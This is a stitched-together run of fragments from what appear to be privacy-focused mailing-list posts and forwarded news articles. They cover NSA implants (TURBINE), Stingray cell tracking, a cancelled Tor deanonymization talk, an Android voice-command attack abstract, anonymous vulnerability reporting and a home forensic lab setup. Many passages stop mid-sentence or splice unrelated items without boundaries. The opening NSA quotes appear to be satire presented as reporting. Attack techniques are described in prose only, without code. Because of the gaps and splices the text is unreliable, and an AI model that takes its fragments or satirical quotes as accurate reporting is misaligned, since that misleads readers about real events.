"It's really clever if you think about it.", one anonymous expert on
the wiki explained. "First, they put the real terrorists on notice,
adding to operational paranoia. But second, they get to enable every
device crossing the border at their discretion with minimal concern!"
When asked for comment, the National Security Agency replied they
could 'neither confirm nor deny any knowledge of "mobile phones"'.

quotes, yet in a brave show of defiance we stood up for our readership
and refused. "" Take that NSA! With Love, The Editors.]
"During the security examination, officers may also ask that owners
power up some devices, including cell phones," it said. "All devices
must be fully unlocked and past any full disk encryption

"Powerless devices will not be permitted on board the aircraft. The

an impasse of extremes, a full or limited dump off the table.
let's find a middle ground. how best to proceed?
very great indeed.  what kind of tools would make the journalists
involved more effective and productive?
1. using the leaks currently published, devise a framework for "data
mining" the leak documents, aka, generating metadata from the data and
operating various matches and relevance across the metadata to narrow
the search and aggregate related efforts or technologies across their
compartmentalized worlds.
2.  requires that there is an index of special terms, techniques,
suppliers, code names, algorithms, etc. that used to generate the
metadata for deeper search and tie to general themes of surveillance.
3. extrapolating from current leaks, also look toward recent
advancements and specific technical tell tales of interest.  doping
silicon as tailored access technique? this could refer to compromised
runs of security processors for desired targets. etc.
4. justifying technical detail specifically.  we have seen so little
technical detail of the source code / hardware design level.  how best
to justify source code - explaining that the language choice, the
nature of the algorithms, the structure of the distributed computing
upon which it runs all conveys critical technical details important to
understand what part of our technologies are compromised, and guiding
the fixes required to protect against such compromises?
in short, it would behoove us to build tools to make the journalists
more effective, rather than bitch about not being included in the
inner circle.  (sadly, many good knowledge discovery tools are
proprietary and applied to open source intelligence)

@_subject: Meet the Muslim-American Leaders the FBI and NSA Have Been Spying On 
latest from The Intercept:
 a choice excerpt:
The FBI—which is listed as the “responsible agency” for surveillance
on the five men—has a controversial record when it comes to the ethnic
profiling of Muslim-Americans. According to FBI training materials
uncovered by Wired in 2011, the bureau taught agents to treat
“mainstream” Muslims as supporters of terrorism, to view charitable
donations by Muslims as “a funding mechanism for combat,” and to view
Islam itself as a “Death Star” that must be destroyed if terrorism is
to be contained.
John Guandolo, a former FBI counterterrorism official who takes credit
for developing a training program for agents on the “Muslim
Brotherhood and their subversive movement in the United States,” told
The Intercept that he participated in investigations of some of the
individuals whose email accounts were monitored. Echoing the “red
under every bed” hysteria of the McCarthy era, Guandolo believes that
“hundreds” of covert members of the Muslim Brotherhood are active in
the United States, that some of them have succeeded in infiltrating
the Pentagon, and that CIA director John Brennan is a secret Muslim.
Other former and current federal officials say such beliefs are not
representative of the FBI or Justice Department. But blatant prejudice
against Muslim-Americans is also documented in the Snowden archive.
In one 2005 document, intelligence community personnel are instructed
how to properly format internal memos to justify FISA surveillance. In
the place where the target’s real name would go, the memo offers a
fake name as a placeholder: “Mohammed Raghead.”

@_subject: Strong Security Processes Require Strong Privacy Protections 
"Strong Security Processes Require Strong Privacy Protections"
A request for all security conscious organizations handling
vulnerability reports to deploy privacy enhancing technologies.
With the Snowden disclosures and Google's Project Zero on the minds of
security professionals everywhere, it is time to evaluate one more
aspect of this renewed focus on 0day and targeted attacks:
vulnerability submission to vendors. [0][1]
Software vulnerabilities of use to nation states and espionage
organizations are recognized as a threat to privacy and basic human
rights. Their impact no longer dismissable or discounted given
evidence of misuse. I will not discuss hardware vulnerabilities in
this treatment as they entail different considerations and
constraints. [2]
Reporting vulnerabilities of this nature in turn requires strong
privacy protections commensurate with the five and six digit monetary
values they command, and the adversaries intent on discouraging their
discovery or mitigation. [3][4]
Therefore, any organization handling vulnerability reports must
support strong privacy for vulnerability submission. This is mandatory
even if most or all issues received via this channel are not 0day, not
high value, and entail very little risk to users.
The characteristics of a strong private reporting method are:
- Email must not be used. In the best circumstances email leaks too
much information. In common situations it is passed around clear text,
trivially interfered with, and winds through software with huge
usability and vulnerability problems. Email for initial security
vulnerability reporting must cease immediately. [5][6]
- Public web systems for vulnerability reporting must not be used.
Like email, this leaks too much information and is vulnerable to a
wide array of attacks destroying any privacy intended. [7][8]
- Submission of reports via hidden site required. This has become
fashionable in media organizations as the "secure drop" for
whistleblowers, and it is equally apropriate for vulnerability
reporting. This significantly raises the cost of surveilling a
vulnerability reporting service, and ensures that passive interception
of reported vulnerabilities is impossible. [9]
- Encryption of submitted reports required. PGP and GPG are wonderful
tools, despite encrypted email being a dismal failure. While the
hidden drop may protect the privacy of the reporter, encryption of the
report content to specific vulnerability researchers' keys ensures
privacy to the receiver. A compromise of the hidden site must not lead
to access of reported vulnerabilities. [10]
- Submitter anonymity the default. Submissions and communication must
accomodate an anonymous identity. If a researcher wishes to claim
credit they must opt-in and provide additional information. No
psuedonymous account requirements, no key linking across submissions.
- Obfuscated disclosure should be available if desired. Capturing 0day
in the wild used for espionage or cyber effects is a rare event.
Publicly disclosing when, where, and how you obtained such captures
ensures you're likely never to see any others. Researchers in position
to observe and inspect such events should be able to report the
vulnerabilities without credit and without indicating the origin. A
vendor could provide a "cover story" for how the vulnerability was
discovered internally, to best protect sources' ability to continue to
discover these types of weaponized exploits in the wild.
Finally, it goes without saying that this privacy applies during
reporting and mitigation phases of defect resolution. Once a patch is
prepared and public the details of the vulnerability should be public
as well, via email list, public blog, or any other useful medium.
As participants in the security industry it behooves us all to set an
example for others and to demonstrate a committment to security and
privacy via action.
Security conscious organizations handling vulnerability reports can
support strong privacy and send a clear message deploying private
reporting methods described above.
Security researchers must demand strong privacy from organizations
they collaborate with, even in the most trivial or minor of
circumstances, so that infrequent severe vulnerabilities may also be
reported in confidence.
Privacy is a basic human right we must all support. Let's demonstrate
our support by using privacy enhancing technologies to resolve risks
to privacy!

for those technical, the minimum viable toolset for identifying low

- a solid base (clean hw, clean installs, clean environment) in a
separate location with RF shielding. (a closed metal barn out in the
country, for example. if you're a geek you love the thought of a
faraday closet ;)
- instrumented runtime (e.g. volatility memory forensics, system
performance profiling, all to append only storage) on any systems you
are using as suspect to attack.
- obstructed runtime (see thread on "how to hack your systems before
someone else") - this is optional; a modified system that appears to
be vulnerable / stock condition will exhibit undefined behavior under
attempted enabling, sometimes. otherwise it may be difficult to
identify a successful infection.
- direct flash memory pinout rig (specs for all chips including flash
memory associated with BIOS, integrated management controllers,
network devices, I/O ports, keyboard, trac pad or mouse, HD/DVD/CD
drives, graphics memory, wifi, 4g, and bluetooth wireless adapters
will be needed  you're programming an FPGA to perform reads directly
from the flash chips. converting flash memory into high level block
storage the next black art upward.
- wide band high performance software defined radio. you will be
building custom GNU radio blocks and running many from third party
repositories or research projects. you are using a two stage process,
where wide sweeps and auto ranging are applied to sample swaths of
signal of interest to storage. then parallel processing on other
hardware or later time (off-use-hours) extracting known / useful data
and anomalies for further analysis.
- in-line network archival, shaping, and cut-out for link to internet
ethernet bridge with ARP spoofing and ether mangling at each end. that
does not speak IP at all. the shaping is used to squelch suspect or
unexpected peak traffic (both a signalling system for malicious
activity and a means to constrain the reach once compromised)
as per the kit above,
you are instrumenting a system to observe its runtime behavior on an
external audit system. this is because the advanced attacks inject
into processes and ring0, persisting only what is needed / chosen
(enabling hooks). you need to capture the active payloads that are
delivered on-demand in host memory space.
you are observing the network and RF space for anomalies and
discrepancies. for example, a wifi radio disabled yet still emitting
into 2.4Ghz/5.xGhz spectrum.  network captures also provide evidence
to correlate with malicious memory, for example identifying a payload
delivered over the network, with keys from volatility used to decrypt
the encrypted communications containing the payload identified in
you are (sometimes destructively) sampling all flash memory as parts
of advanced payloads persist outside of the OS and storage level
interface visibility. (stealth at bus/bios level). discrepancies in
blocks that should not have changed, executable code segments where
not expected, strange carvings of wear leveling around "protected"
offsets. all of these are indicators for further scrutiny and
instruction level reversing (if corresponding to microcontroller
programming instructions for manipulating streams read or written to
and from device, for example :)
last but not least, you are not getting attached to any hardware,
because at any moment you may find it all suspect and have to replace
all laptops, desktops, routers, printers, mobile devices, storage
media, media servers, smart televisions, and god forbid you installed
one of those intelligent thermostats. [ laugh for sanity, then go back

---------- Forwarded message ----------
Carnegie Mellon Kills Black Hat Talk About Identifying Tor Users -- Perhaps
Because It Broke Wiretapping Laws
from the questionable-legality dept
There's some buzz in security circles today after it came out that a session
at the upcoming Black Hat Conference entitled "You Don't Have to be the NSA
to Break Tor: Deanonymizing Users on a Budget" by Michael McCord and
Alexander Volynkin (both of whom work for Carnegie-Mellon University and
CERT) had been pulled from the conference at the request of CMU.
A Black Hat spokeswoman told Reuters that the talk had been canceled at the
request of lawyers for Carnegie-Mellon University, where the speakers work as
researchers. A CMU spokesman had no immediate comment.
There's been plenty of speculation about what's going on, but Chris Soghoian
has a pretty good thesis that the researchers likely didn't have
institutional approval or consent of the users they were identifying, meaning
that they were potentially violating wiretapping statutes. As he notes,
running a Tor server to try to spy on Tor traffic without talking to lawyers
is a very bad idea. While it hasn't yet been confirmed that this is what
happened, it certainly is a pretty sensible theory.
Of course, none of that changes the fact that it's possible to identify some
Tor users. But... that's also not particularly new. In fact, we've discussed
in the past how the feds can identify Tor users. Tor adds an important layer
of protection, but there are plenty of ways that you can still be identified
while using Tor. Just ask Russ Ulbricht. The problem isn't so much Tor itself
but how people use it -- and the simple fact is that most people use it in a
way that will eventually reveal who they are. While it's not definite, it
seems likely that this is what the talk would have revealed. Shutting it down
wasn't any sort of big attempt to cover up this fact, but perhaps it was to

'... nearly all Android devices equipped with Google Services
Framework can be affected by GVS-Attack'
Previous research about sensor based attacks on Android platform
focused mainly on accessing or controlling over sensitive device
components, such as camera, microphone and GPS. These approaches get
data from sensors directly and need corresponding sensor invoking
This paper presents a novel approach (GVS-Attack) to launch permission
bypassing attacks from a zero permission Android application
(VoicEmployer) through the speaker. The idea of GVS-Attack utilizes an
Android system built-in voice assistant module -- Google Voice Search.
Through Android Intent mechanism, VoicEmployer triggers Google Voice
Search to the foreground, and then plays prepared audio files (like
"call number 1234 5678") in the background. Google Voice Search can
recognize this voice command and execute corresponding operations.
With ingenious designs, our GVS-Attack can forge SMS/Email, access
privacy information, transmit sensitive data and achieve remote
control without any permission.
Also we found a vulnerability of status checking in Google Search app,
which can be utilized by GVS-Attack to dial arbitrary numbers even
when the phone is securely locked with password. A prototype of
VoicEmployer has been implemented to demonstrate the feasibility of
GVS-Attack in real world. In theory, nearly all Android devices
equipped with Google Services Framework can be affected by GVS-Attack.
This study may inspire application developers and researchers rethink
that zero permission doesn't mean safety and the speaker can be
treated as a new attack surface.

References: ---------- Forwarded message ----------
We had already agreed to disable assembly optimizations in pycryptopp,
because there seem to have been a lot of bugs in the optimized
assembly code in the past, and because the added speed really makes no
difference to our uses, as far as I know.
However, in order to explain and justify to other people (e.g. Debian
packagers) why we are doing this, and why they should consider doing
the same thing themselves, I just read through the entire history of
issues in pycryptopp and classified whether they were runtime errors
(and therefore potential security bugs) or build-time errors
(therefore probably not), and whether they would have been avoided if
we had been disabling assembly optimizations all along. Here are the
results. They clearly show that we should disable the optimized
assembly! About half of all the security-threatening bugs we've had
would never have been an issue if we'd avoided assembly from the
By the way, in my opinion the author of Crypto++, Wei Dai, is an
*exceptionally* skilled, careful, and experienced coder, and I would
assume that if Crypto++ has had this many security-threatening bugs in
its optimized assembly code, then other crypto libraries that also use
optimized assembly code also have at least as many.

Tor protocol headers to do traffic confirmation attacks.

new Tor Browser releases are ready) will take another step towards
limiting the number of entry guards that are in a position to see
their traffic, thus reducing the damage from future attacks like this
one. Hidden service operators should consider changing the location of
their hidden service.

XKeyScore classifiers for your data exhaust,
"Identity Intelligence and Special Operations"
 - Posted on Jul.30, 2014  by Steven Aftergood
"Identity intelligence” is a relatively new intelligence construct
that refers to the analysis and use of personal information, including
biometric and forensic data among others, to identify intelligence
targets of interest and to deny them anonymity.
The term began to appear a few years ago and was included, for
example, in a 2012 Defense Intelligence Agencybriefing package. Since
then it has quickly propagated throughout U.S. military and
intelligence operations.
The new DoD doctrine on Special Operations — Joint Publication 3-05,
dated 16 July 2014 — includes further discussion of identity
intelligence (I2) in the special operations context:
“I2 is the collection, analysis, exploitation, and management of
identity attributes and associated technologies and processes. The
identification process utilizes biometrics-enabled intelligence (BEI),
forensics-enabled intelligence (FEI), information obtained through
document and media exploitation (DOMEX), and combat information and
intelligence to identify a person or members of a group.”
“I2 fuses identity attributes (biological, biographical, behavioral,
and reputational information related to individuals) and other
information and intelligence associated with those attributes
collected across all intelligence disciplines….”
“USSOCOM [US Special Operations Command] exploits biometric, forensic,
document and media data collections and integrates the data with
all-source intelligence to locate and track unattributed identities
across multiple or disparate instances. Intelligence collections are
processed through the appropriate DOD and interagency databases,
exploited to produce intelligence, and then disseminated to deployed
SOF and throughout the interagency. I2 products enable real-time
decisions in special operations worldwide.”
“Special operations require unique modes of employment, tactics,
techniques, procedures, and equipment. They are often conducted in
hostile, denied, or politically and/or diplomatically sensitive
environments, and are characterized by one or more of the following:
time-sensitivity, clandestine or covert nature, low visibility, work
with or through indigenous forces, greater requirements for regional
orientation and cultural expertise, and a higher degree of risk,” JP
3-05 says.

U.S. Marshals Seize Local Cops’ Cell Phone Tracking Files in
Extraordinary Attempt to Keep Information From Public
Government Secrecy
By Nathan Freed Wessler, Staff Attorney, ACLU Speech, Privacy &
Technology Project at 12:13pm
A run-of-the-mill public records request about cell phone surveillance
submitted to a local police department in Florida has unearthed
blatant violations of open government laws, including an incredible
seizure of state records by the U.S. Marshals Service, which is part
of the Justice Department. Today the ACLU and the ACLU of Florida
filed an emergency motion in state court to preserve the public’s
right of access to government records.
Over the past several months, the ACLU has filed dozens of public
records requests with Florida law enforcement agencies seeking
information about their use of controversial cell phone tracking
devices known as “stingrays.” (The devices are also known as “cell
site simulators” or “IMSI catchers.”) Stingrays track phones by
mimicking service providers’ cell towers and sending out powerful
signals that trick nearby phones — including phones of countless
bystanders — into sending their locations and identifying information.
The Florida agencies’ responses to our requests have varied widely,
with some stonewalling and others releasing records. The most recent
request went to the Sarasota Police Department, and the fallout from
that request has raised red flag after red flag.
RED FLAG  The Sarasota Police initially told us that they had
responsive records, including applications filed by and orders issued
to a local detective under the state “trap and trace” statute that he
had relied on for authorization to conduct stingray surveillance. That
raised the first red flag, since trap and trace orders are typically
used to gather limited information about the phone numbers of incoming
calls, not to track cell phones inside private spaces or conduct
dragnet surveillance. And, such orders require a very low legal
standard. As one federal magistrate judge has held, police should be
permitted to use stingrays only after obtaining a probable cause
warrant, if at all.
RED FLAG  The Sarasota Police set up an appointment for us to
inspect the applications and orders, as required by Florida law. But a
few hours before that appointment, an assistant city attorney sent an
email cancelling the meeting on the basis that the U.S. Marshals
Service was claiming the records as their own and instructing the
local cops not to release them. Their explanation: the Marshals
Service had deputized the local officer, and therefore the records
were actually the property of the federal government.
We emphatically disagree, since the Sarasota detective created the
applications, brought them to court, and retained the applications and
orders in his files. Merely giving him a second title (“Special Deputy
U.S. Marshal”) does not change these facts. But regardless, once the
Sarasota Police Department received our records request, state law
required them to hold onto the records for at least 30 days, to give
us an opportunity to go to court and seek an order for release of the
Instead of complying with that clear legal obligation, the local
police allowed the records to disappear by letting the U.S. Marshals
drive down from their office in Tampa, seize the physical files, and
move them to an unknown location. We’ve seen our fair share of federal
government attempts to keep records about stingrays secret, but we’ve
never seen an actual physical raid on state records in order to
conceal them from public view.
RED FLAG  Realizing we weren’t going to get hold of the Sarasota
Police Department’s copies of the applications and orders anytime
soon, we asked the county court if we could obtain copies from its
files. Incredibly, the court said it had no copies. The court doesn’t
even have docket entries indicating that applications were filed or
orders issued. Apparently, the local detective came to court with a
single paper copy of the application and proposed order, and then
walked out with the same papers once signed by a judge.
Court rules — and the First Amendment — require judges to retain
copies of judicial records and to make them available to the public,
but the court (and the detective) completely flouted those
requirements here.
The ACLU’s emergency motion seeks a temporary injunction preventing
the Sarasota Police Department from transferring any more files to the
U.S. Marshals, as well as a determination that the police violated
state law by sending the stingray applications and orders to the
Marshals Service in the first place and an order requiring the police
to produce the records.
When the government obtains court authorization to use invasive
surveillance equipment, the public should not be kept in the dark. We
have open records laws for a reason, but they mean nothing if the
government can violate their clear commands at its whim.

- The Known Tools Hint at Deeper Invasive Techniques, Also Lacking Oversight
not only is location / metadata (penregister) information obtained,

1% making the cut is a far too generous estimate, perhaps 1% of 1%. as
for the cost issue, which must be paid somewhere,
you make two assumptions:
first, assuming the externalities of insecure systems are simply
non-exist-ant.  the costs of our pervasive vulnerability are
gargantuan, yet the complexity and cost of robust alternatives
instills paralysis. (this lack of significant progress in development
of secure systems feeds your defeatist observations; it's ok ;)
second, that the schedules and styles of development as we currently
practice it will always be.  if you solved a core (commodity) infosec
problem once, very well, in a way that could be widely adopted, you
would only need to implement it once! (then spending five years and
ten fold cost building to last becomes reasonable)
for now, it appears stasis and external costs are the status quo.  the
future, if here at all, is clearly not yet widely distributed...

References: Stingrays can track cell phones whenever the phones are turned on, not
just when they are making or receiving calls.
Stingrays force cell phones in range to transmit information back “at
full signal, consuming battery faster.” Is your phone losing battery
power particularly quickly today? Maybe the cops are using a stingray
When in use, stingrays are “evaluating all the [cell phone] handsets
in the area” in order to search for the suspect’s phone. That means
that large numbers of innocent bystanders’ location and phone
information is captured.
In this case, police used two versions of the stingray — one mounted
on a police vehicle, and the other carried by hand. Police drove
through the area using the vehicle-based device until they found the
apartment complex in which the target phone was located, and then they
walked around with the handheld device and stood “at every door and
every window in that complex” until they figured out which apartment
the phone was located in. In other words, police were lurking outside
people’s windows and sending powerful electronic signals into their
private homes in order to collect information from within.
The Tallahassee detective testifying in the hearing estimated that,
between spring of 2007 and August of 2010, the Tallahassee Police had
used stingrays approximately “200 or more times.”

Right now, we're gearing for MuckRock's biggest investigative project
yet, and we need your help. First, a little context.
Local police departments across America are increasingly tapping into
information from your cell phone: Your location, who you're with, who
you are calling. Using fake cell phone towers, often called Stingrays,
they generally don't even need a warrant, and have relatively few
restrictions on who, when, and what they collect. Or how they use it.
Since these programs are often funded by federal grants,  very few
people outside of law enforcement know how, or even if, they're being
used, with almost non-existent debate about if this information should
be collected, and what limits should be set for for how it's used or
how long it's kept.
This is where you come in. We're launching this project on Beacon
Reader, where a donation of just $5, about what it costs for us to
successfully file a request, can make a big difference. Just like with
the Drone Census, often times MuckRock is the *only* group asking for
this information, which otherwise would never be made public.
You can support the project at this link, and, again, even just $5 can
make a huge difference:
If you're not in a position to help financially, we would still really
appreciate your help — share what we're up to with your friends,
sending in news articles you see or tips regarding cell phone
tracking, and, in a few days, sending in information regarding which
departments you'd like us to file with through a special page on
Thanks for all your support in the past, and we're looking forward to
working with you to shine a light on this under-reported area.

Encryption Works -

as we have seen from the current leaks and past history, encryption

encryption provides cover for backdoors and side channels you don't

encryption with broken keys provides false confidence leading to greater losses.
encryption with poor usability fails catastrophically, undoing the
privacy of all prior exchanges in a single fatal swoop.
encryption's specialized nature leads to centralized authorities and

my biased thoughts:
1. attacking like NSA means being in the middle.  you can do this over
various types of networks and protocols with very modest hardware;.
less than off-the-shelf. the key is position, not hardware brute
strength. (i don't consider passive surveillance an attack - more like
an operational reality ;)
2. scale and effectiveness are the dials that distinguish NSA attacks
from other adversaries.  scale in the sense they're pwning global
networks as mandatory objective; DPI at terabits an interesting
technical challenge by any measure.  and effectiveness in that
tailored access and offensive espionage techniques combine into a
platform where many-0day and fully automated attack sequences are
shown to achieve objectives with regularity and totality that makes
any offensive infosec analyst admire.
the hardware bits get exotic when dealing on fringe power levels,
miniature scale, or algorithmic complexities outside the norm. these
exotic hardware kits are by no means mandatory, nor the most
interesting aspect of these systems.

Pulitzer-winning reporter Barton Gellman, who describes Edward Snowden
as ending an era of indifference to surveillance
Jemima Kiss
theguardian.com, Monday 10 March 2014 16.45 GMT
Encryptions tools must be simplified and made accessible for the
mainstream, Pulitzer-winning journalist Barton Gellman said on Monday,
calling on the tech industry to have the courage and ingenuity to help
address the disparity of power between the people and their
Addressing the SXSW festival shortly before Edward Snowden's live
speech by video, Gellman said we are a long way off simple,
transparent encryption tools. He cited Pew research which found that
88% of Americans say they have taken steps to protect their privacy in
some form.
"With all the user interface brains out there we could get easier
tools," he said. "But it's not just the ability to encrypt, it's a
frame of mind, a workflow and a discipline that is alien to most
people, and that is the opposite to the open nature of the consumer
internet. You could use Tor to access a site a hundred times, but the
101st time you forget, you may as well not have used Tor."
"There are people at this conference who have taken very considerable
risk to protect the privacy of their customers and have put themselves
at the edge of the door to jail and it will take courage as well as
ingenuity to change the way things work."
Metadata is more powerful than phone tapping
Gellman, who interviewed Snowden in Russia in 2013, said Snowden has
highlighted the peak indifference to security. Metadata is incredibly
potent as a method of surveillance, yet most internet users fail to
understand how powerful it can be in aggregate.
"One of the great gifts of Snowden is that he has shown what
surveillance can do," he said. Gellman told of a colleague who said he
wasn't concerned about metadata and his privacy, a colleague who used
Twitter heavily and with location stamps.
So Gellman downloaded three months worth of Twitter location stamps
and plotted them on a Google map, plotting the times, frequency and
significance of each location. His horrified colleague consequently
changed much of his behaviour online.
"I would rather someone listened in to all my phone calls than
accessed my metadata - you can learn much more about me from that
Whistleblowers - traitors or lantern bearers?
Gellman doesn't like the word 'whistleblower'. On one side are many in
government who say he signed an agreement not to disclose information,
and that disclosing specific unlawful behaviour, or waste, should be
dealt with by internal channels. Snowden himself did speak to around
ten supervisors and to colleagues informally with some questions about
their work, and at one point asked if what they were doing would pass
'the front page test'.
"That's a pretty bold thing to do when you're gathering documents and
speaking to three reporters," he said. "But the illegality test is too
"If the idea is genuine that the government works for us, and
information is power, we are living inside a one-way mirror because
they know more and more about us and we know less and less about them.
There's a huge disparity of power."
"Do we think it's a good idea to listen to every call, to bust
encryption standards... if it's a big policy question, and stuff is
being done behind our backs that might shock us if we knew about it,
there's pretty good reason to put it out there. Forget whistleblower -
it should be lantern holder."
How has the NSA surveillance story stayed live?
"Snowden paid very careful attention to what had happened to other
whistleblowers that hadn't had a long-term impact, and was careful to
produce the documents... If Snowden had asked me 6-8 months later [if
this story and still been live] but he has got to have exceed every
plausible estimation about impact. It's because he didn't realise the
documents all at once."
That pace was less about Snowden releasing the documents slowly but
about the work journalists need to do to verify and interrogate before
they publish.
Doctorow said he was most concerned by the programmes known as Bullrun
in the US and Edgehill in the UK, which saw the NSA spend $250,000 a
year spend trying to sabotage security standards and have backdoors
built into security products.
"In the second world war, countries had their own encryption tools but
now we share networks and tools, and if you can undermine the random
number generator - if you can make it less random - and that's what
the NSA was doing by trying to trick, buy or persuade companies to
make their encryption more breakable," said Gellman. "They would
create an encryption standard that only they would break - that would
let them be both information assurance and signal intelligence."
Was Prism effectively a front for the more substantial fibre optic and
undersea cable tapping? Interviewing Gellman, Cory Doctorow said: "The
reason for Prism was to give them a plausible reason to know about the
things they knew from the fibre taps and not alerting the companies."
When Prism started Twitter barely existed, Facebook was limited to
college campuses and Google was tiny.
How did Snowden get the documents out?
Asked whether he has been harassed when writing about Snowden, Gellman said no.
"I have not been harassed. I've had some interesting exchanges with
government reps of various temperatures. But I speak to them before
every story. If they want to demonstrate falsity I want to hear it,
and if they want to tell me about specific damage I would be doing

and I assume that I'm more interesting than I used to be. And Google
has warned me that they believe a state-sponsored hacker is attempting
to compromise my computer... I assume that is more likely to be a

"Do I worry about doing harm and putting lives at risk? Of course I
do. There are things in the documents I don't think should be
published and there are things Snowden doesn't think should be
"He's a very smart guy on a lot of levels, and a very nimble mind.

How the NSA Plans to Infect 'Millions' of Computers with Malware
By Ryan Gallagher and Glenn Greenwald 12 Mar 2014, 9:19 AM EDT
Top-secret documents reveal that the National Security Agency is
dramatically expanding its ability to covertly hack into computers on
a mass scale by using automated systems that reduce the level of human
oversight in the process.
The classified files - provided previously by NSA whistleblower Edward
Snowden - contain new details about groundbreaking surveillance
technology the agency has developed to infect potentially millions of
computers worldwide with malware "implants." The clandestine
initiative enables the NSA to break into targeted computers and to
siphon out data from foreign Internet and phone networks.
The covert infrastructure that supports the hacking efforts operates
from the agency's headquarters in Fort Meade, Maryland, and from
eavesdropping bases in the United Kingdom and Japan. GCHQ, the British
intelligence agency, appears to have played an integral role in
helping to develop the implants tactic.
In some cases the NSA has masqueraded as a fake Facebook server, using
the social media site as a launching pad to infect a target's computer
and exfiltrate files from a hard drive. In others, it has sent out
spam emails laced with the malware, which can be tailored to covertly
record audio from a computer's microphone and take snapshots with its
webcam. The hacking systems have also enabled the NSA to launch
cyberattacks by corrupting and disrupting file downloads or denying
access to websites.
The implants being deployed were once reserved for a few hundred
hard-to-reach targets, whose communications could not be monitored
through traditional wiretaps. But the documents analyzed by The
Intercept show how the NSA has aggressively accelerated its hacking
initiatives in the past decade by computerizing some processes
previously handled by humans. The automated system - codenamed TURBINE
- is designed to "allow the current implant network to scale to large
size (millions of implants) by creating a system that does automated
control implants by groups instead of individually."
In a top-secret presentation, dated August 2009, the NSA describes a
pre-programmed part of the covert infrastructure called the "Expert
System," which is designed to operate "like the brain." The system
manages the applications and functions of the implants and "decides"
what tools they need to best extract data from infected machines.
Mikko Hypponen, an expert in malware who serves as chief research
officer at the Finnish security firm F-Secure, calls the revelations
"disturbing." The NSA's surveillance techniques, he warns, could
inadvertently be undermining the security of the Internet.
"When they deploy malware on systems," Hypponen says, "they
potentially create new vulnerabilities in these systems, making them
more vulnerable for attacks by third parties."
Hypponen believes that governments could arguably justify using
malware in a small number of targeted cases against adversaries. But
millions of malware implants being deployed by the NSA as part of an
automated process, he says, would be "out of control."
"That would definitely not be proportionate," Hypponen says. "It
couldn't possibly be targeted and named. It sounds like wholesale
infection and wholesale surveillance."
The NSA declined to answer questions about its deployment of implants,
pointing to a new presidential policy directive announced by President
Obama. "As the president made clear on 17 January," the agency said in
a statement, "signals intelligence shall be collected exclusively
where there is a foreign intelligence or counterintelligence purpose
to support national and departmental missions, and not for any other
"Owning the Net"
The NSA began rapidly escalating its hacking efforts a decade ago. In
2004, according to secret internal records, the agency was managing a
small network of only 100 to 150 implants. But over the next six to
eight years, as an elite unit called Tailored Access Operations (TAO)
recruited new hackers and developed new malware tools, the number of
implants soared to tens of thousands.
To penetrate foreign computer networks and monitor communications that
it did not have access to through other means, the NSA wanted to go
beyond the limits of traditional signals intelligence, or SIGINT, the
agency's term for the interception of electronic communications.
Instead, it sought to broaden "active" surveillance methods - tactics
designed to directly infiltrate a target's computers or network
In the documents, the agency describes such techniques as "a more
aggressive approach to SIGINT" and says that the TAO unit's mission is
to "aggressively scale" these operations.
But the NSA recognized that managing a massive network of implants is
too big a job for humans alone.
"One of the greatest challenges for active SIGINT/attack is scale,"
explains the top-secret presentation from 2009. "Human 'drivers' limit
ability for large-scale exploitation (humans tend to operate within
their own environment, not taking into account the bigger picture)."
The agency's solution was TURBINE. Developed as part of TAO unit, it
is described in the leaked documents as an "intelligent command and
control capability" that enables "industrial-scale exploitation."
TURBINE was designed to make deploying malware much easier for the
NSA's hackers by reducing their role in overseeing its functions. The
system would "relieve the user from needing to know/care about the
details," the NSA's Technology Directorate notes in one secret
document from 2009. "For example, a user should be able to ask for
'all details about application X' and not need to know how and where
the application keeps files, registry entries, user application data,
In practice, this meant that TURBINE would automate crucial processes
that previously had to be performed manually - including the
configuration of the implants as well as surveillance collection, or
"tasking," of data from infected systems. But automating these
processes was about much more than a simple technicality. The move
represented a major tactical shift within the NSA that was expected to
have a profound impact - allowing the agency to push forward into a
new frontier of surveillance operations.
The ramifications are starkly illustrated in one undated top-secret
NSA document, which describes how the agency planned for TURBINE to

Eventually, the secret files indicate, the NSA's plans for TURBINE
came to fruition. The system has been operational in some capacity
since at least July 2010, and its role has become increasingly central
to NSA hacking operations.
Earlier reports based on the Snowden files indicate that the NSA has
already deployed between 85,000 and 100,000 of its implants against
computers and networks across the world, with plans to keep on scaling
up those numbers.
The intelligence community's top-secret "Black Budget" for 2013,
obtained by Snowden, lists TURBINE as part of a broader NSA
surveillance initiative named "Owning the Net."
The agency sought $67.6 million in taxpayer funding for its Owning the
Net program last year. Some of the money was earmarked for TURBINE,
expanding the system to encompass "a wider variety" of networks and
"enabling greater automation of computer network exploitation."
Circumventing Encryption
The NSA has a diverse arsenal of malware tools, each highly
sophisticated and customizable for different purposes.
One implant, codenamed UNITEDRAKE, can be used with a variety of
"plug-ins" that enable the agency to gain total control of an infected
An implant plug-in named CAPTIVATEDAUDIENCE, for example, is used to
take over a targeted computer's microphone and record conversations
taking place near the device. Another, GUMFISH, can covertly take over
a computer's webcam and snap photographs. FOGGYBOTTOM records logs of
Internet browsing histories and collects login details and passwords
used to access websites and email accounts. GROK is used to log
keystrokes. And SALVAGERABBIT exfiltrates data from removable flash
drives that connect to an infected computer.
The implants can enable the NSA to circumvent privacy-enhancing
encryption tools that are used to browse the Internet anonymously or
scramble the contents of emails as they are being sent across
networks. That's because the NSA's malware gives the agency unfettered
access to a target's computer before the user protects their
communications with encryption.
It is unclear how many of the implants are being deployed on an annual
basis or which variants of them are currently active in computer
systems across the world.
Previous reports have alleged that the NSA worked with Israel to
develop the Stuxnet malware, which was used to sabotage Iranian
nuclear facilities. The agency also reportedly worked with Israel to
deploy malware called Flame to infiltrate computers and spy on
communications in countries across the Middle East.
According to the Snowden files, the technology has been used to seek
out terror suspects as well as individuals regarded by the NSA as
"extremist." But the mandate of the NSA's hackers is not limited to
invading the systems of those who pose a threat to national security.
In one secret post on an internal message board, an operative from the
NSA's Signals Intelligence Directorate describes using malware attacks
against systems administrators who work at foreign phone and Internet
service providers. By hacking an administrator's computer, the agency
can gain covert access to communications that are processed by his
company. "Sys admins are a means to an end," the NSA operative writes.
The internal post - titled "I hunt sys admins" - makes clear that
terrorists aren't the only targets of such NSA attacks. Compromising a
systems administrator, the operative notes, makes it easier to get to
other targets of interest, including any "government official that
happens to be using the network some admin takes care of."
Similar tactics have been adopted by Government Communications
Headquarters, the NSA's British counterpart. As the German newspaper
Der Spiegel reported in September, GCHQ hacked computers belonging to
network engineers at Belgacom, the Belgian telecommunications
The mission, codenamed "Operation Socialist," was designed to enable
GCHQ to monitor mobile phones connected to Belgacom's network. The
secret files deem the mission a "success," and indicate that the
